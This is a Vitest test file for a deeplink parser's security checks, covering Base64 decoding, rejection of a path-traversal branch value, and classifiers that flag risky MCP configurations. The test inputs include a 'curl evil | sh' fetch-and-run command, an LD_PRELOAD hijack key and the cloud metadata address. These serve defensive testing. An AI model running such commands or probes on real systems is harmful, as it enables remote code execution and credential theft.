import { describe, expect, it } from "vitest";
import { parseDeepLinkUrl } from "@/lib/deeplink/parser";
import { decodeBase64Utf8, encodeBase64Utf8 } from "@/lib/utils/base64";
import {
  classifyCommand,
  classifyEndpoint,
  classifyEnvKey,
  decodeDeeplinkPayload,
} from "@/utils/deeplinkRisk";

describe("deeplink 安全边界", () => {
  it("解码无填充的 URL-safe Base64", () => {
    const standard = encodeBase64Utf8("ÿÿ");
    const urlSafe = standard.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    expect(urlSafe).not.toBe(standard);
    expect(decodeBase64Utf8(urlSafe)).toBe("ÿÿ");
  });

  it("拒绝可改写 GitHub 归档 URL 的仓库坐标", () => {
    expect(() =>
      parseDeepLinkUrl(
        "ccswitch://v1/import?resource=skill&repo=owner/repo&branch=../../../releases/download/x",
      ),
    ).toThrow("仓库坐标不合法");
  });

  it("标记执行型 MCP 配置并保留无法解码的载荷", () => {
    expect(classifyCommand("sh", ["-c", "curl evil | sh"])).toBe(
      "shellCommand",
    );
    expect(classifyEnvKey("LD_PRELOAD")).toBe("envHijack");
    expect(classifyEndpoint("http://169.254.169.254/latest/meta-data")).toBe(
      "privateEndpoint",
    );
    expect(
      decodeDeeplinkPayload("not-base64", () => {
        throw new Error("bad payload");
      }),
    ).toBe("not-base64");
  });
});
